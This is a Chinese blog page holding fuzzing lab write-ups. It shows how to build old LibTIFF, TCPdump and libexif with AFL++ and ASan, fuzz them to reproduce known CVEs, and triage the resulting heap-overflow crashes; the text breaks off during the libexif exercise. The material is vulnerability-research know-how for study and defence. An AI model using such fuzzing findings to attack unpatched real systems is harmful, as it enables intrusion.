<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$HOME/fuzzing_tiff/install/bin/tiffinfo -D -j -c -r -s -w &#x27;/home/fuzz/fuzzing_tiff/out/default/crashes/id:000000,sig:06,src:000000,time:1806,execs:1009,op:havoc,rep:1&#x27;</span><br></pre></td></tr></table></figure>

<p>可以得到一个很好的奔溃摘要，包括执行跟踪</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d2cd658d-76fb-46c4-b06c-bd53d3b12cca" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/875f63bb-309b-41e4-8953-5c656452de7d" alt="image"></p>
<p>报错信息</p>
<p>AddressSanitizer: heap-buffer-overflow on address 0x602000000071 at pc 0x0000002aafc2 bp 0x7ffd9d5ea570 sp 0x7ffd9d5e9d30</p>
<p>堆溢出</p>
<h5 id="5、代码覆盖度量"><a href="#5、代码覆盖度量" class="headerlink" title="5、代码覆盖度量"></a>5、代码覆盖度量</h5><p>尝试度量PoC的代码覆盖率。<strong>需要获得一个覆盖率html报告</strong>，类似于上面的例子。</p>
<h5 id="6、修复问题"><a href="#6、修复问题" class="headerlink" title="6、修复问题"></a>6、修复问题</h5><p>修复bug后重建目标，并检查PoC不再使程序崩溃</p>
<h4 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h4><p>通过这个实验，我了解了<strong>CVE-2016-9297</strong>漏洞，学会如何使用LCOV来衡量代码覆盖率，如何使用代码覆盖率数据来提高模糊测试的有效性、</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/07/29/Exercise%204%20-%20LibTIFF/" data-id="clkr6x7zn0000jgvf5oxhc4ry" data-title="Exercise 4 - LibTIFF" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Fuzzing/" rel="tag">Fuzzing</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-Exercise 3 - TCPdump" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/07/28/Exercise%203%20-%20TCPdump/" class="article-date">
  <time class="dt-published" datetime="2023-07-28T15:20:46.000Z" itemprop="datePublished">2023-07-28</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/07/28/Exercise%203%20-%20TCPdump/">Exercise 3 - TCPdump</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h3 id="Exercise-3-TCPdump"><a href="#Exercise-3-TCPdump" class="headerlink" title="Exercise 3 - TCPdump"></a>Exercise 3 - TCPdump</h3><h4 id="一、实验背景"><a href="#一、实验背景" class="headerlink" title="一、实验背景"></a>一、实验背景</h4><p><strong>CVE-2017-13028</strong>是一个越界读取漏洞，可以通过BOOTP数据包(引导协议)触发，越界读取是当程序读取数据超过预期缓冲区的末尾或开始之前时发生的漏洞。因此，它允许远程攻击者导致拒绝服务或可能从进程内存中获取潜在的敏感信息。</p>
<p>越界读取漏洞（<a target="_blank" rel="noopener" href="https://cwe.mitre.org/data/definitions/125.html%EF%BC%89">https://cwe.mitre.org/data/definitions/125.html）</a></p>
<p>**AddressSanitizer (ASan)**是C和c++的快速内存错误检测器。它最初是由谷歌(Konstantin Serebryany, Derek Bruening, Alexander Potapenko, Dmitry Vyukov)开发的，并于2011年5月首次发布。</p>
<p>它由编译器插装模块和运行时库组成。该工具能够查找对堆、堆栈和全局对象的越界访问，以及use-after-free、double-free和内存泄漏错误。</p>
<p>AddressSanitizer是开源的，并且从3.1版开始集成到LLVM编译器工具链中。虽然它最初是作为LLVM的一个项目开发的，但它已被移植到GCC，并包含在GCC版本&gt;&#x3D; 4.8中</p>
<p>AddressSanitizer（<a target="_blank" rel="noopener" href="https://clang.llvm.org/docs/AddressSanitizer.html%EF%BC%89">https://clang.llvm.org/docs/AddressSanitizer.html）</a></p>
<h4 id="二、实验目的"><a href="#二、实验目的" class="headerlink" title="二、实验目的"></a>二、实验目的</h4><p>模糊<strong>TCPdump</strong>数据包分析器。目标是在TCPdump 4.9.2中找到<a target="_blank" rel="noopener" href="https://www.cvedetails.com/cve/CVE-2017-13028/"><strong>CVE-2017-13028</strong></a>漏洞</p>
<h4 id="三、实验环境："><a href="#三、实验环境：" class="headerlink" title="三、实验环境："></a>三、实验环境：</h4><p>win10，VMware，Ubuntu 20.04.2 LTS（虚拟机用户名密码均为fuzz）</p>
<h4 id="四、实验步骤"><a href="#四、实验步骤" class="headerlink" title="四、实验步骤"></a>四、实验步骤</h4><h5 id="1、下载并构建目标"><a href="#1、下载并构建目标" class="headerlink" title="1、下载并构建目标"></a>1、下载并构建目标</h5><p>得到模糊目标，为要模糊化的项目创建一个新目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd $HOME</span><br><span class="line">mkdir fuzzing_tcpdump &amp;&amp; cd fuzzing_tcpdump/</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/08529bcf-9f4f-44f8-9b8a-fc8c80dd303f" alt="image"></p>
<p>下载并解压tcpdump-4.9.2.tar.gz</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/the-tcpdump-group/tcpdump/archive/refs/tags/tcpdump-4.9.2.tar.gz</span><br><span class="line">tar -xzvf tcpdump-4.9.2.tar.gz</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/bfafe340-fe3e-4521-aa84-99e79d11de50" alt="image"></p>
<p>下载libpcap（TCPdump需要的一个跨平台库）并解压libpcap-1.8.0.tar.gz</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/the-tcpdump-group/libpcap/archive/refs/tags/libpcap-1.8.0.tar.gz</span><br><span class="line">tar -xzvf libpcap-1.8.0.tar.gz</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/981bf9e9-66de-4a6e-b4c3-4327c333682f" alt="image"></p>
<p>我们需要将“libpcap-libpcap-1.8.0”重命名为“libpcap-1.8.0”。否则，tcpdump找不到libpcap的本地路径</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv libpcap-libpcap-1.8.0/ libpcap-1.8.0</span><br></pre></td></tr></table></figure>

<p>构建并安装libpcap</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd $HOME/fuzzing_tcpdump/libpcap-1.8.0/</span><br><span class="line">./configure --enable-shared=no</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/974188b3-5f85-4f20-a6f2-7dcc627c78c1" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/b003c591-59df-4828-95e4-f362af91c420" alt="image"></p>
<p>构建并安装tcpdump</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd $HOME/fuzzing_tcpdump/tcpdump-tcpdump-4.9.2/</span><br><span class="line">./configure --prefix=&quot;$HOME/fuzzing_tcpdump/install/&quot;</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/460187ad-7234-43ad-bec8-63e8178e715d" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9eedf66f-4119-400d-bc4d-d58e8b58bf94" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/7ebb9a99-b83b-491c-91f4-bdc587c57128" alt="image"></p>
<p>测试工作是否正常</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$HOME/fuzzing_tcpdump/install/sbin/tcpdump -h</span><br></pre></td></tr></table></figure>

<p>看到如下页面说明正常</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/264ba0de-6a31-42f3-9b6f-c7edd627277b" alt="image"></p>
<p>tcpdump version 4.9.2</p>
<p>libpcap version 1.8.0</p>
<p>检查版本号是否与实验手册的一致，若一致，则继续下面的实验</p>
<h5 id="2、创建种子语料库"><a href="#2、创建种子语料库" class="headerlink" title="2、创建种子语料库"></a>2、创建种子语料库</h5><p>可以在“.pcap”中找到许多. pcap示例，“&#x2F;tests”文件夹中。你可以用下面的命令行运行这些.pcap文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$HOME/fuzzing_tcpdump/install/sbin/tcpdump -vvvvXX -ee -nn -r [.pcap file]</span><br></pre></td></tr></table></figure>

<p>例如</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$HOME/fuzzing_tcpdump/install/sbin/tcpdump -vvvvXX -ee -nn -r ./tests/geneve.pcap</span><br></pre></td></tr></table></figure>

<p>然后会看到如下页面</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d9cb8f69-7ae5-42bf-b696-979a1f1486c8" alt="image"></p>
<h5 id="3、构建时启用ASan"><a href="#3、构建时启用ASan" class="headerlink" title="3、构建时启用ASan"></a>3、构建时启用ASan</h5><p>构建启用了ASAN的tcpdump(和libpcap)</p>
<p>要清理所有之前编译过的目标文件和可执行文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">rm -r $HOME/fuzzing_tcpdump/install</span><br><span class="line">cd $HOME/fuzzing_tcpdump/libpcap-1.8.0/</span><br><span class="line">make clean</span><br><span class="line"></span><br><span class="line">cd $HOME/fuzzing_tcpdump/tcpdump-tcpdump-4.9.2/</span><br><span class="line">make clean</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/3ca726e2-3cf7-4e8d-89eb-a7e5024694b0" alt="image"></p>
<p>调用configure和make之前设置AFL_USE_ASAN&#x3D;1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cd $HOME/fuzzing_tcpdump/libpcap-1.8.0/</span><br><span class="line">export LLVM_CONFIG=&quot;llvm-config-11&quot;</span><br><span class="line">CC=afl-clang-lto ./configure --enable-shared=no --prefix=&quot;$HOME/fuzzing_tcpdump/install/&quot;</span><br><span class="line">AFL_USE_ASAN=1 make</span><br><span class="line"></span><br><span class="line">cd $HOME/fuzzing_tcpdump/tcpdump-tcpdump-4.9.2/</span><br><span class="line">AFL_USE_ASAN=1 CC=afl-clang-lto ./configure --prefix=&quot;$HOME/fuzzing_tcpdump/install/&quot;</span><br><span class="line">AFL_USE_ASAN=1 make</span><br><span class="line">AFL_USE_ASAN=1 make install</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/73a731ea-8db7-45bb-9120-360aa22920bf" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/f83b04a9-8e88-4db5-8164-98e5b97ce159" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/98bb0804-ab9a-41b7-8bba-182e0e0fa707" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/5cfcf84a-4ed9-4218-892e-76eec8896e49" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/03482b76-83ce-4a72-9b7a-d5123b3c6d87" alt="image"></p>
<p>Afl-clang-lto编译可能需要几分钟才能完成</p>
<h5 id="4、fuzzing"><a href="#4、fuzzing" class="headerlink" title="4、fuzzing"></a>4、fuzzing</h5><p>使用以下命令运行fuzzer</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -m none -i $HOME/fuzzing_tcpdump/tcpdump-tcpdump-4.9.2/tests/ -o $HOME/fuzzing_tcpdump/out/ -s 123 -- $HOME/fuzzing_tcpdump/install/sbin/tcpdump -vvvvXX -ee -nn -r @@</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/1b93ccc5-cd10-46e8-b67d-a00d8d92e6f7" alt="image"></p>
<p>注意:64位系统上的ASAN需要大量虚拟内存。这就是为什么我在AFL中设置了禁用内存限制的标志“-m none”</p>
<p>几小时后可以看见有多个崩溃</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9afc9e90-8010-4369-9714-a521fa4b27c7" alt="image"></p>
<h5 id="5、Triage"><a href="#5、Triage" class="headerlink" title="5、Triage"></a>5、Triage</h5><p>调试用ASan构建的程序，需要给程序提供崩溃文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$HOME/fuzzing_tcpdump/install/sbin/tcpdump -vvvvXX -ee -nn -r &#x27;/home/fuzz/fuzzing_tcpdump/out/default/crashes/id:000000,sig:06,src:003788,time:8574962,execs:1212760,op:havoc,rep:3&#x27;</span><br></pre></td></tr></table></figure>

<p>可以得到一个很好的奔溃摘要，包括执行跟踪</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/f86b6892-bc13-46f9-a1c8-7f4372793def" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/ca42c834-fc39-4701-a80d-18eb4d768d13" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/f07ba962-ecff-40d8-9447-c445a1501cee" alt="image"></p>
<p>报错信息</p>
<p>AddressSanitizer: heap-buffer-overflow on address 0x6100000000ff at pc 0x0000003cee45 bp 0x7fff77cbed90 sp 0x7fff77cbe538</p>
<p>堆溢出</p>
<h5 id="6、修复问题"><a href="#6、修复问题" class="headerlink" title="6、修复问题"></a>6、修复问题</h5><p><a target="_blank" rel="noopener" href="https://github.com/the-tcpdump-group/tcpdump/commit/85078eeaf4bf8fcdc14a4e79b516f92b6ab520fc#diff-05f854a9033643de07f0d0059bc5b98f3b314eeb1e2499ea1057e925e6501ae8L381">https://github.com/the-tcpdump-group/tcpdump/commit/85078eeaf4bf8fcdc14a4e79b516f92b6ab520fc#diff-05f854a9033643de07f0d0059bc5b98f3b314eeb1e2499ea1057e925e6501ae8L381</a></p>
<h4 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h4><p>通过这个实验，我了解了<strong>CVE-2017-13028</strong>漏洞，了解运行时内存错误检测工具**ASan (Address Sanitizer)**，学会如何使用ASAN模糊目标，使用ASan对崩溃进行分类</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/07/28/Exercise%203%20-%20TCPdump/" data-id="clkrvnqux0000kkvfc4kx342f" data-title="Exercise 3 - TCPdump" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Fuzzing/" rel="tag">Fuzzing</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-Exercise 2 - libexif" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/07/27/Exercise%202%20-%20libexif/" class="article-date">
  <time class="dt-published" datetime="2023-07-27T15:32:15.000Z" itemprop="datePublished">2023-07-27</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/07/27/Exercise%202%20-%20libexif/">Exercise 2 - libexif</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h3 id="Exercise-2-libexif"><a href="#Exercise-2-libexif" class="headerlink" title="Exercise 2 - libexif"></a>Exercise 2 - libexif</h3><h4 id="一、实验背景"><a href="#一、实验背景" class="headerlink" title="一、实验背景"></a>一、实验背景</h4><p><strong>CVE-2009-3895</strong>是一个基于堆的缓冲区溢出，可以通过无效的EXIF图像触发。基于堆的缓冲区溢出是发生在堆数据区域的一种缓冲区溢出，它通常与显式动态内存管理(使用malloc()和free()函数进行分配&#x2F;回收)有关。因此，远程攻击者可以利用此问题在使用受影响库的应用程序上下文中执行任意代码。</p>
<p>基于堆的缓冲区溢出漏洞（<a target="_blank" rel="noopener" href="https://cwe.mitre.org/data/definitions/122.html%EF%BC%89">https://cwe.mitre.org/data/definitions/122.html）</a></p>
<p><strong>CVE-2012-2836</strong>是一个越界读取漏洞，可以通过带有精心制作的EXIF标签的图像触发。越界读取是当程序读取数据超过预期缓冲区的末尾或开始之前时发生的漏洞。因此，它允许远程攻击者导致拒绝服务或可能从进程内存中获取潜在的敏感信息。</p>
<p>越界读取漏洞（<a target="_blank" rel="noopener" href="https://cwe.mitre.org/data/definitions/125.html%EF%BC%89">https://cwe.mitre.org/data/definitions/125.html）</a></p>
<h4 id="二、实验目的"><a href="#二、实验目的" class="headerlink" title="二、实验目的"></a>二、实验目的</h4><p>这次我们将模糊<strong>libexif</strong> EXIF解析库。目标是在libxif 0.6.14中找到<a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3895"><strong>CVE-2009-3895</strong></a>和<a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-2836"><strong>CVE-2012-2836</strong></a>的崩溃&#x2F;PoC。</p>
<h4 id="三、实验环境："><a href="#三、实验环境：" class="headerlink" title="三、实验环境："></a>三、实验环境：</h4><p>win10，VMware，Ubuntu 20.04.2 LTS（虚拟机用户名密码均为fuzz）</p>
<h4 id="四、实验步骤"><a href="#四、实验步骤" class="headerlink" title="四、实验步骤"></a>四、实验步骤</h4><h5 id="1、下载并构建目标"><a href="#1、下载并构建目标" class="headerlink" title="1、下载并构建目标"></a>1、下载并构建目标</h5><p>为模糊的项目创建一个新目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd $HOME</span><br><span class="line">mkdir fuzzing_libexif &amp;&amp; cd fuzzing_libexif/</span><br></pre></td></tr></table></figure>

<p>下载并解压libexif-0.6.14</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/libexif/libexif/archive/refs/tags/libexif-0_6_14-release.tar.gz</span><br><span class="line">tar -xzvf libexif-0_6_14-release.tar.gz</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/6543f29e-5e52-4ed6-999c-597161314a56" alt="image"></p>
<p>构建并安装libexif</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd libexif-libexif-0_6_14-release/</span><br><span class="line">sudo apt-get install autopoint libtool gettext libpopt-dev</span><br><span class="line">autoreconf -fvi</span><br><span class="line">./configure --enable-shared=no --prefix=&quot;$HOME/fuzzing_libexif/install/&quot;</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/5e1c7727-dce4-41eb-95dc-bff5012fb3ff" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/83e655dd-f4d6-47ea-94df-31c9d62dba34" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/974d2755-eeb5-4ae1-b5b1-3cc5fc523a92" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/7c84d35d-8784-486c-b206-e7e8a9e53568" alt="image"></p>
<p><img src="C:\Users\15646\AppData\Roaming\Typora\typora-user-images\image-20230727232107643.png" alt="image-20230727232107643"></p>
<h5 id="2、选择一个接口应用程序"><a href="#2、选择一个接口应用程序" class="headerlink" title="2、选择一个接口应用程序"></a>2、选择一个接口应用程序</h5><p>libexif是一个库，我们需要另一个应用程序来使用这个库，这个应用程序将被模糊化。对于这个任务，我们将使用<strong>exif command-line</strong>，下载并解压exif command-line 0.6.15:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd $HOME/fuzzing_libexif</span><br><span class="line">wget https://github.com/libexif/exif/archive/refs/tags/exif-0_6_15-release.tar.gz</span><br><span class="line">tar -xzvf exif-0_6_15-release.tar.gz</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/473d3e7e-3ab3-4ae1-9c98-5640bddcaa2c" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/10a19b33-857d-4b49-8d17-efb4e7254066" alt="image"></p>
<p>构建并安装exif command-line实用程序</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd exif-exif-0_6_15-release/</span><br><span class="line">autoreconf -fvi</span><br><span class="line">./configure --enable-shared=no --prefix=&quot;$HOME/fuzzing_libexif/install/&quot; PKG_CONFIG_PATH=$HOME/fuzzing_libexif/install/lib/pkgconfig</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/2971a8cb-5f5a-40d6-9af5-5b99c740b55a" alt="image"></p>
<p><img src="C:\Users\15646\AppData\Roaming\Typora\typora-user-images\image-20230727232415273.png" alt="image-20230727232415273"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/b3fd1cbf-249c-4a2d-b601-f4193f815c12" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/f0807bd9-9ea0-49b5-9481-683f38202257" alt="image"></p>
<p>测试是否正常工作</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$HOME/fuzzing_libexif/install/bin/exif</span><br></pre></td></tr></table></figure>

<p>看到如下页面说明工作正常</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/3f53db47-04ea-461c-8c9e-859ffd12f4da" alt="image"></p>
<h5 id="3、创建种子语料库"><a href="#3、创建种子语料库" class="headerlink" title="3、创建种子语料库"></a>3、创建种子语料库</h5><p>现在我们需要一些出口样本。我们将使用以下repo中的样例图像:<a target="_blank" rel="noopener" href="https://github.com/ianare/exif-samples%E3%80%82%E9%80%9A%E8%BF%87%E4%BB%A5%E4%B8%8B%E6%8C%87%E4%BB%A4%E4%B8%8B%E8%BD%BD">https://github.com/ianare/exif-samples。通过以下指令下载</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd $HOME/fuzzing_libexif</span><br><span class="line">wget https://github.com/ianare/exif-samples/archive/refs/heads/master.zip</span><br><span class="line">unzip master.zip</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/7453ee21-bca8-4d98-9f25-350141d0e7f3" alt="image"></p>
<p>举例</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$HOME/fuzzing_libexif/install/bin/exif $HOME/fuzzing_libexif/exif-samples-master/jpg/Canon_40D_photoshop_import.jpg</span><br></pre></td></tr></table></figure>

<p>可以看到如下输出</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/3a12071e-4332-4383-9d85-1612dbc00b38" alt="image"></p>
<h5 id="4、Afl-clang-lto"><a href="#4、Afl-clang-lto" class="headerlink" title="4、Afl-clang-lto"></a>4、Afl-clang-lto</h5><p>使用<strong>afl-clang-lto</strong>作为编译器来构建libexif。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">rm -r $HOME/fuzzing_libexif/install</span><br><span class="line">cd $HOME/fuzzing_libexif/libexif-libexif-0_6_14-release/</span><br><span class="line">make clean</span><br><span class="line">export LLVM_CONFIG=&quot;llvm-config-11&quot;</span><br><span class="line">CC=afl-clang-lto ./configure --enable-shared=no --prefix=&quot;$HOME/fuzzing_libexif/install/&quot;</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd $HOME/fuzzing_libexif/exif-exif-0_6_15-release</span><br><span class="line">make clean</span><br><span class="line">export LLVM_CONFIG=&quot;llvm-config-11&quot;</span><br><span class="line">CC=afl-clang-lto ./configure --enable-shared=no --prefix=&quot;$HOME/fuzzing_libexif/install/&quot; PKG_CONFIG_PATH=$HOME/fuzzing_libexif/install/lib/pkgconfig</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/110ef19c-eaf2-45bd-a3db-de5b980cc57a" alt="image"></p>
<p><img src="C:\Users\15646\AppData\Roaming\Typora\typora-user-images\image-20230727233607562.png" alt="image-20230727233607562"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/6e6e8f30-0b1e-4603-94d4-65139cd9fede" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/c58fa0c8-927b-4c29-bd92-ec842081e184" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/412bb374-a138-4d29-b912-96ebfc9bae38" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/fbdc3cb0-7f3f-4f5a-b68e-44ce3cea911e" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d79bf6e4-f593-49d0-95fb-efd4fc1a2c39" alt="image"></p>
<p><img src="C:\Users\15646\AppData\Roaming\Typora\typora-user-images\image-20230727233940330.png" alt="image-20230727233940330"></p>
<p>使用了<strong>afl-clang-lto</strong>而不是<strong>afl-clang-fast</strong>。一般来说，<strong>afl-clang-lto</strong>是最好的选择，因为它是一个无冲突的工具，而且它比<strong>afl-clang-fast</strong>快。</p>
<p>如果不确定何时使用<strong>afl-clang-lto</strong>或<strong>afl-clang-fast</strong>，可以检查从[AFLplusplus:检测目标]提取的下图(<a target="_blank" rel="noopener" href="https://github.com/AFLplusplus/AFLplusplus#1-instrumenting-that-target">https://github.com/AFLplusplus/AFLplusplus#1-instrumenting-that-target</a>)</p>
<p>](<a target="_blank" rel="noopener" href="https://github.com/AFLplusplus/AFLplusplus#1-instrumenting-that-target">https://github.com/AFLplusplus/AFLplusplus#1-instrumenting-that-target</a>)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">+--------------------------------+</span><br><span class="line">| clang/clang++ 11+ is available | --&gt; use LTO mode (afl-clang-lto/afl-clang-lto++)</span><br><span class="line">+--------------------------------+     see [instrumentation/README.lto.md](instrumentation/README.lto.md)</span><br><span class="line">    |</span><br><span class="line">    | if not, or if the target fails with LTO afl-clang-lto/++</span><br><span class="line">    |</span><br><span class="line">    v</span><br><span class="line">+---------------------------------+</span><br><span class="line">| clang/clang++ 6.0+ is available | --&gt; use LLVM mode (afl-clang-fast/afl-clang-fast++)</span><br><span class="line">+---------------------------------+     see [instrumentation/README.llvm.md](instrumentation/README.llvm.md)</span><br><span class="line">    |</span><br><span class="line">    | if not, or if the target fails with LLVM 